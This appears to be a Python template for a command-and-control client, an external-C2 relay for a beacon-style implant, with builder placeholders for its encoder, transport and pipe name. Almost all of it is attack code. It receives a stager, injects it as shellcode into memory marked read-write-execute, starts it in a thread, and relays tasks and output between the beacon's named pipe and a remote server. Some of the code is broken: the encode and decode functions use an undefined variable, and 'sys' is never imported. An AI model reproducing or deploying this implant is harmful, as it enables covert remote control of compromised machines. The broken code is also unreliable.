from ctypes import *
import struct
from sys import exit
from time import sleep
import win32file
import base64
from ast import literal_eval

# <encoder imports>

# </encoder imports>


# <transport imports>

# </transport imports>


# <configurations>
# ```[var:::client_consts]```
# </configurations>


# <encoder functions>
```[var:::encoder_code]```
# </encoder functions>


# <transport functions>
```[var:::transport_code]```
# </transport functions>

# Client core
C2_BLOCK_TIME = int(```[var:::c2_block_time]```)
CLIENT_ID = ```[var:::client_id]```

def start_beacon(payload):
    shellcode =  bytearray(payload)
    buf = (c_char * len(shellcode)).from_buffer(shellcode)
    ptr = windll.kernel32.VirtualAlloc(c_int(0),
                                       c_int(len(shellcode)),
                                       c_int(0x3000), # MEM_COMMIT
                                       c_int(0x40)) # PAGE_EXECUTE_READWRITE
    
    windll.kernel32.RtlMoveMemory(c_int(ptr), buf, c_int(len(shellcode)))
    windll.kernel32.CreateThread(None, c_int(0), c_int(ptr), None, c_int(0), None)

# Open the handle to the pipe
def open_handle():
    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3
    SECURITY_SQOS_PRESENT = 0x100000
    SECURITY_ANONYMOUS = 0x0
    while 1:
        pipe_handle = windll.kernel32.CreateFileA(```[var:::c2_pipe_name]```,
                                                  GENERIC_READ|GENERIC_WRITE,
                                                  c_int(0),
                                                  None,
                                                  OPEN_EXISTING,
                                                  SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS,
                                                  None)
        if pipe_handle != -1:
            break
    return pipe_handle


def read_frame(handle):
    print "Handle is: %s" % (str(handle))
    result, size = win32file.ReadFile(handle, 4, None)
    size = struct.unpack('<I', size)[0]
    result, chunk = win32file.ReadFile(handle, size, None)
    return chunk

def ReadPipe(handle):
    return read_frame(handle)

def write_frame(handle, chunk):
    wrote = c_int(0)
    chunklen = len(chunk)
    chunklen = struct.pack('<I', chunklen)
    win32file.WriteFile(handle, chunklen, None)
    win32file.WriteFile(handle, chunk, None)
    return 0


def WritePipe(handle,chunk):
    print "Writing to pipe: %s" %(chunk)
    return write_frame(handle, chunk)

def task_encode(task):
    return base64.b64encode(data)

def task_decode(task):
    return base64.b64decode(data)

def go():
    print "Waiting for stager..."
    p = recvData()
    print "Got a stager! loading..."
    sleep(2)
    # Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
    beacon_thread = start_beacon(p)
    handle_beacon = open_handle()
    # Grabbing and relaying the metadata from the SMB pipe is done during interact()
    print "Loaded, and got handle to beacon. Getting METADATA."

    return handle_beacon

def interact(handle_beacon):
    try:
        while(True):
            
            # LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
            chunk = ReadPipe(handle_beacon)
            if chunk < 0:
                print 'readpipe %d' % (len(chunk))
                break
            else:
                print "Received %d bytes from pipe" % (len(chunk))
            print "relaying chunk to server"
            resp_frame = [CLIENT_ID, task_encode(chunk)]
            sendData(CLIENT_ID, resp_frame)

            # LOGIC TO CHECK FOR A NEW TASK
            print "Checking for new tasks from transport"
            
            newTask = recvData(CLIENT_ID)

            newTask_frame = [newTask[0], task_decode(newTask[1])]

            print "Got new task: %s" % (newTask_frame[1])
            print "Writing %s bytes to pipe" % (len(newTask_frame[1]))
            r = WritePipe(handle_beacon, newTask_frame[1])
            print "Wrote %s bytes to pipe" % (r)
            sleep(C2_BLOCK_TIME/100)
    except KeyboardInterrupt:
        print "Caught escape signal"
        sys.exit(0)


# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# Run the main loop, keyboard escape available for debugging
try:
    interact(handle_beacon)
except KeyboardInterrupt:
    print "Caught escape signal"
    exit(0)
